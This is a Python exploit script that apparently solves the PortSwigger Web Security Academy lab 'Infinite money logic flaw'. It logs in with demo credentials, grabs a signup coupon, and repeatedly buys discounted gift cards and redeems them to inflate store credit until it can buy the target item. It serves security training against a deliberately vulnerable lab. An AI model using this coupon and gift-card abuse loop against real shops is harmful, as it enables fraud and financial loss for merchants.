# Lab: Infinite money logic flaw
# difficulty: practitioner
import urllib3
import requests
from pwn import log
import base64
from bs4 import BeautifulSoup
import re
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sub = '0a61007804412b03818e984e00a6006a'
url = f'https://{sub}.web-security-academy.net'
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

L33T_LEATHER_JACKET_ID = 1
GIFT_CARD_ID = 2

def get_csrf_token(endpoint = '/') -> str:
    log.info(f'getting csrf token for {endpoint}')
    res = s.get(f'{url}{endpoint}',
                verify=False,
                proxies=proxy
                )
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        csrf = soup.find("input", {'name': 'csrf'})['value']
    except:
        log.error("csrf token not found")
        exit(1)
    return csrf

def get_coupon() -> str:
    csrf = get_csrf_token()
    body = {
        'csrf': csrf,
        'email': f'{random.randint(0, 99)}@gmail.com'
    }

    res = s.post(f'{url}/sign-up',
                        data=body,
                        proxies=proxy,
                        verify=False,
                        allow_redirects=True
                        )
    if res.status_code != 200:
        log.error('failed to get coupon')
        exit(1)

    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        # <script>alert('Use coupon SIGNUP30 at checkout!')</script>
        coupon = str(soup.find_all('script')[1]).split(' ')[2]
        log.success('coupon: %s', coupon)
    except:
        log.error('failed parse coupon')
        exit(1)
    return coupon

def get_current_money() -> int:
    res = s.get(f'{url}/my-account')
    # <p><strong>Store credit: $119.00</strong></p>
    credit = int(re.findall(r'Store credit: \$([0-9]+)', res.text)[0])
    log.info('current money: %s', credit)
    return credit

def login():
    csrf = get_csrf_token('/login')
    body = {
        'username': 'wiener',
        'password': 'peter',
        'csrf': csrf,
    }
    
    res = s.post(url + '/login', data=body)
    if res.status_code != 200:
        log.error('login failed')
        exit(1)
    log.success('login successful')
    log.info('cookie: %s', s.cookies['session'].replace('%3d', '='))

def buy_item(productId, coupon='') -> requests.Response:
    body = {
        'productId': productId,
        'quantity': 1,
        'redir': 'PRODUCT', # required by server
    }

    r = s.post(f'{url}/cart', 
            data=body,
            allow_redirects=False,
            proxies=proxy,
            verify=False,
            )
    if r.status_code != 302:
        log.error('failed add item %d', productId)
        exit(1)

    csrf = get_csrf_token('/cart')
    if '' != coupon:
        r = s.post(f'{url}/cart/coupon',
                    data={'coupon': coupon, 'csrf': csrf},
                    proxies=proxy,
                    verify=False,
                    )
        if r.status_code != 200:
            log.error('failed to apply coupon')
            exit(1)

    res = s.post(f'{url}/cart/checkout',
                data={'csrf': csrf},
                proxies=proxy,
                verify=False,
                )
    if r.status_code != 200:
        log.error('failed to checkout')
        exit(1)
    log.success('item %d bought', productId)

    return res

def redeem_gift_card(coupon):
    res = buy_item(GIFT_CARD_ID, coupon)
    
    gift_card = re.findall(r'<td>([a-zA-Z0-9]+)</td>', res.text)
    log.info('gift card: %s', gift_card[1])

    csrf = get_csrf_token('/my-account')
    res = s.post(f'{url}/gift-card',
                data={'csrf': csrf, 'gift-card': gift_card[1]},
                )
    if res.status_code != 200:
        log.error('failed to redeem gift card')
        exit(1)
    log.success(f'gift card {gift_card[1]} redeemed')

def exploit():
    coupon = get_coupon()
    while get_current_money() < 1337:
        redeem_gift_card(coupon)

    res = buy_item(L33T_LEATHER_JACKET_ID, coupon)
    if res.status_code != 200:
        log.error('failed l33t')
        exit(1)
    log.success('y33t')

if __name__ == '__main__':
    global s
    s = requests.Session()

    login()
    exploit()